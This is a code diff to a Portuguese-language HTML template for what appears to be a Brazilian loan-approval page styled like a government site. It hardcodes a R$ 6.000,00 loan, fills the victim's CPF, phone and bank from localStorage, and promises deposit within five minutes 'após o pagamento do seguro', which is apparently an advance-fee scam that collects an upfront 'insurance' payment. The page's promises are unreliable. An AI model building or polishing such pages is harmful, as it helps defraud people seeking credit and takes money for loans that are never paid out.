@@ -348,15 +348,15 @@
                 <div style="background-color: #f5f8ff; padding: 20px; border-radius: 8px; border: 1px solid #ddd; margin-bottom: 20px;">
                     <div style="margin-bottom: 15px;">
                         <div style="font-weight: 600; color: #1351b4; margin-bottom: 5px;">Valor do Empréstimo:</div>
-                        <div style="font-size: 1.2rem; font-weight: 700; color: #28a745;">R$ 4.000,00</div>
+                        <div style="font-size: 1.2rem; font-weight: 700; color: #28a745;" id="loanAmountText">R$ 6.000,00</div>
                     </div>
                     
                     <div style="margin-bottom: 15px;">
                         <div style="font-weight: 600; color: #1351b4; margin-bottom: 5px;">Dados Bancários:</div>
                         <div style="font-size: 1rem;">
-                            <div style="margin-bottom: 5px;"><strong>Banco:</strong> {{ bank|default("CAIXA ECONÔMICA FEDERAL") }}</div>
-                            <div style="margin-bottom: 5px;"><strong>Chave PIX:</strong> {{ pix_key|default(cpf) }}</div>
-                            <div><strong>Tipo de Chave:</strong> {{ key_type|default("CPF") }}</div>
+                            <div style="margin-bottom: 5px;"><strong>Banco:</strong> <span id="selectedBank">CAIXA ECONÔMICA FEDERAL</span></div>
+                            <div style="margin-bottom: 5px;"><strong>Chave PIX:</strong> <span id="pixKeyText">(61) 99108-9985</span></div>
+                            <div><strong>Tipo de Chave:</strong> Telefone</div>
                         </div>
                     </div>
                     
@@ -371,8 +371,27 @@
                         <i class="fas fa-info-circle" style="color: #f39c12; font-size: 1.2rem; margin-right: 10px;"></i>
                         <div style="font-weight: 600; color: #f39c12;">Importante:</div>
                     </div>
-                    <p style="margin: 0; line-height: 1.4;">Após o pagamento do seguro, o valor de <strong>R$ 4.000,00</strong> será depositado em até <strong>5 minutos</strong> na conta vinculada ao CPF <strong>{{ cpf }}</strong>.</p>
+                    <p style="margin: 0; line-height: 1.4;">Após o pagamento do seguro, o valor de <strong id="loanAmountText2">R$ 6.000,00</strong> será depositado em até <strong>5 minutos</strong> na conta vinculada ao CPF <strong id="userCpfText">{{ cpf }}</strong>.</p>
                 </div>
+
+                <script>
+                    document.addEventListener('DOMContentLoaded', function() {
+                        // Load data from localStorage
+                        const loanData = JSON.parse(localStorage.getItem('loanData') || '{"amount":"6000","monthly":"68","term":"90"}');
+                        const userData = JSON.parse(localStorage.getItem('userData') || '{"nome":"","cpf":"","loanValue":"6000","phone":""}');
+                        const selectedBank = localStorage.getItem('selectedBank') || 'CAIXA ECONÔMICA FEDERAL';
+                        
+                        // Format loan amount
+                        const formattedAmount = `R$ ${Number(loanData.amount).toLocaleString('pt-BR', {minimumFractionDigits: 2})}`;
+                        
+                        // Update elements
+                        document.getElementById('loanAmountText').textContent = formattedAmount;
+                        document.getElementById('loanAmountText2').textContent = formattedAmount;
+                        document.getElementById('selectedBank').textContent = selectedBank;
+                        document.getElementById('userCpfText').textContent = userData.cpf;
+                        document.getElementById('pixKeyText').textContent = userData.phone ? `(${userData.phone.slice(0,2)}) ${userData.phone.slice(2,7)}-${userData.phone.slice(7)}` : userData.cpf;
+                    });
+                </script>
             </div>
 
             <div style="margin: 20px 0; display: flex; flex-direction: column; align-items: center;">
